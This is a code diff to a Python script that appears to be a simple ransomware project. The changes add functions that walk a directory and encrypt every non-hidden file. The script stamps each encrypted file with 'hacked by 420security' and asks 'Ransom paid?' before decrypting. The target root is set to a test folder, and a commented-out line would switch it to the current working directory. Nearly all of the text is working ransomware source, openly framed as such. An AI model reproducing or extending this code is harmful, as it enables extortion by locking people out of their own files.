@@ -92,8 +92,6 @@ def check_keys():
 
     return
         
-    
-
 
 def MyRSAFileEncrypt(filepath):
     """
@@ -163,7 +161,7 @@ def writeToJSON(RSACipher, C, IV, tag, ext, filepath):
     """
     data = {}
 
-    data["signature"] = "hacked by 420security"
+    data["mark"] = "hacked by 420security"
     data["RSACipher"] = b64encode(RSACipher).decode("utf-8")
     data["C"] = b64encode(C).decode("utf-8")
     data["IV"] = b64encode(IV).decode("utf-8")
@@ -215,18 +213,44 @@ def makeFile(m, filepath, ext):
     out_file.close()
     
 
+def encrypt_all_files(root):
+    files = getPaths(root)
+
+    for f in files:
+        MyRSAFileEncrypt(f)
+
+
+def decrypt_all_files(root):
+    files = getPaths(root)
+    
+    for f in files:
+        MyRSAFileDecrypt(f)
+
+
+def getPaths(root):
+    paths = []
+    for rt, dirs, files in os.walk(root):   # root, directories, files
+        for f in files:
+            if f[0] != '.':  # not looking at hidden files (doesn't work)
+                paths.append(os.path.join(rt, f))
+
+    return paths
+
 
 def main():
-
+    root = 'test-files/'
+    # root = os.getcwD()
     
-    # filepath = "test-files/test.txt"
-    # newpath = "test-files/test.json"
-    filepath = "test-files/happy.jpg"
-    newpath = "test-files/happy.json"
-
-    MyRSAFileEncrypt(filepath)
-    MyRSAFileDecrypt(newpath)
+    enc = input('Encrypt? (y/n): ')
+    if enc == 'y':
+        encrypt_all_files(root)
+        print('Files Encrypted')
     
+    paid = input('Ransom paid? (y/n): ')
+    # paid = 'y'
+    if paid == 'y':
+        decrypt_all_files(root)
+        print('Files Decrypted')
 
 
 main()
